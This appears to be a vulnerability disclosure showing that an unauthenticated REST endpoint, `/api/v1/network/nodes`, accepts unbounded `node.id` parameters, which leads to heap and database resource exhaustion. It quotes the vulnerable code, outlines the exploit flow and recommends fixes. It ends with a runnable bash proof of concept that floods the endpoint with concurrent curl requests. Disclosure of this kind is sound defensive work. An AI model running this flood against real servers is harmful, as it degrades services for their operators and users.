### Title
Unbounded `node.id` EQ Parameter List Enables Resource Exhaustion on `GET /api/v1/network/nodes`

### Summary
The `nodeIds` field in `NetworkNodeRequest` has no `@Size` constraint, allowing an unauthenticated attacker to supply an arbitrarily large number of `node.id=<value>` query parameters. `NetworkServiceImpl.getNetworkNodes()` collects all distinct EQ values into a `HashSet<Long>`, converts them to a `Long[]`, and passes the unbounded array to `networkNodeRepository.findNetworkNodes()`, which embeds it in a PostgreSQL `ANY(:nodeIds)` clause. This causes unbounded heap allocation in the application layer and unbounded parameter-binding overhead in the database layer per request, with no authentication required.

### Finding Description

**Missing constraint — `NetworkNodeRequest.java` line 36-38:**
```java
@RestJavaQueryParam(name = NODE_ID, required = false)
@Builder.Default
private List<NumberRangeParameter> nodeIds = List.of();   // ← no @Size limit
```
Compare to the analogous `RegisteredNodesRequest.java` line 42-44, which correctly applies `@Size(max = 2)`:
```java
@Builder.Default
@RestJavaQueryParam(name = REGISTERED_NODE_ID, required = false)
@Size(max = 2)
private List<NumberRangeParameter> registeredNodeIds = List.of();
```

**Unbounded accumulation — `NetworkServiceImpl.java` lines 106-133:**
```java
final Set<Long> nodeIds = new HashSet<>();
for (final var nodeIdParam : nodeIdParams) {
    if (nodeIdParam.operator() == RangeOperator.EQ) {
        nodeIds.add(nodeIdParam.value());   // ← no cap
    }
    ...
}
...
nodeIdArray = nodeIds.stream().filter(range::contains).toArray(Long[]::new);
```
Every distinct EQ value survives into `nodeIdArray`.

**Unbounded DB array — `NetworkNodeRepository.java` line 96:**
```sql
where (coalesce(array_length(:nodeIds, 1), 0) = 0 or abe.node_id = any(:nodeIds))
```
A `Long[]` of size N is bound as a PostgreSQL array; PostgreSQL must parse, plan, and evaluate `ANY` against it for every row in `address_book_entry`.

**`RequestParameterArgumentResolver.java` lines 229-237** explicitly allows multi-value collection fields to receive all supplied values without any count check:
```java
boolean isMultiValue = field.getType().isArray() || Collection.class.isAssignableFrom(field.getType());
if (!isMultiValue && paramValues.length > 1) {
    throw new IllegalArgumentException(...);
}
Object valueToSet = isMultiValue ? paramValues : paramValues[0];
```

**Exploit flow:**
1. Attacker sends `GET /api/v1/network/nodes?node.id=0&node.id=1&...&node.id=9999` (10 000 distinct valid longs).
2. Spring parses all 10 000 query-string tokens; `RequestParameterArgumentResolver` creates 10 000 `NumberRangeParameter` objects and stores them in the `List`.
3. `getNetworkNodes()` inserts all 10 000 into a `HashSet<Long>`, then calls `.toArray(Long[]::new)` → 10 000-element `Long[]` on the heap.
4. JPA/Hibernate serialises the array as a PostgreSQL `bigint[]` parameter; the DB engine evaluates `ANY` for every `address_book_entry` row.
5. Repeat concurrently across many connections.

**Why existing checks are insufficient:**
- `getEffectiveLimit()` caps the *result* at 25 rows but does not limit the *input* parameter count.
- `@Min(1)` on `limit` is unrelated.
- The `HashSet` deduplicates identical values but does not bound the total count when the attacker uses distinct values.
- There is no rate-limiting, authentication, or per-parameter-count guard on this endpoint.

### Impact Explanation
Each malicious request allocates O(N) `NumberRangeParameter` objects, an O(N) `HashSet<Long>`, and an O(N) `Long[]`, all on the JVM heap, before issuing a DB query with an O(N) array parameter. With N = 10 000 and a modest concurrency of 20 simultaneous attackers, this translates to hundreds of MB of short-lived heap pressure per GC cycle, elevated GC pause frequency, and measurable CPU overhead in both the application server and the PostgreSQL query planner — sufficient to raise node resource consumption well above 30% compared to baseline. No credentials are required.

### Likelihood Explanation
The endpoint is public (`/api/v1/network/nodes`), requires no authentication, and is documented in the OpenAPI spec. HTTP query strings can carry thousands of repeated parameters; standard tools (`curl`, `ab`, `wrk`, Python `requests`) trivially generate such requests. The attack is stateless, easily scripted, and repeatable at high frequency.

### Recommendation
1. Add `@Size(max = 2)` (or a similarly small bound matching the rest-module convention) to `nodeIds` in `NetworkNodeRequest`, mirroring the existing constraint on `RegisteredNodesRequest.registeredNodeIds`.
2. In `NetworkServiceImpl.getNetworkNodes()`, add an explicit guard: if `nodeIds.size()` exceeds the allowed maximum after parsing, throw `IllegalArgumentException`.
3. Consider enforcing the same constraint at the `RequestParameterArgumentResolver` level for all multi-value collection fields, so the protection is not DTO-specific.

### Proof of Concept
```bash
# Generate a request with 5000 distinct node.id EQ parameters
PARAMS=$(seq 0 4999 | awk '{printf "node.id=%d&", $1}')
curl -s "http://<mirror-node-host>/api/v1/network/nodes?${PARAMS}" -o /dev/null

# Repeat concurrently to observe heap/CPU spike
for i in $(seq 1 50); do
  curl -s "http://<mirror-node-host>/api/v1/network/nodes?${PARAMS}" -o /dev/null &
done
wait
```
Monitor JVM heap usage (e.g., via JMX or `/actuator/metrics`) and PostgreSQL `pg_stat_activity` during the burst; both will show elevated resource consumption relative to the 24-hour baseline.